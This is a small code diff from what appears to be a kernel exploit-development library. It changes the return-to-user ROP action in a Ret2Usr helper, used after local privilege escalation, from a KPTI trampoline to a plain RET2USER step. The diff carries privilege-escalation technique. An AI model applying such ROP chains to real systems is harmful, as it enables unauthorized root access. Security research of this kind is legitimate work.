@@ -39,7 +39,7 @@ void RopUtils::Ret2Usr(RopChain& rop, void* after_lpe_func, size_t stack_size,
   auto stack_start = fake_stack + stack_size - redzone_size;
   for (size_t i = 0; i < redzone_size - 7; i += 8)
     *(uint64_t*)(stack_start + i) = 0xffffff4545454545;  // use canonical address
-  rop.AddRopAction(RopActionId::KPTI_TRAMPOLINE,
+  rop.AddRopAction(RopActionId::RET2USER,
                    {(uint64_t)after_lpe_func, _user_cs, _user_rflags,
                     stack_start, _user_ss});
 }
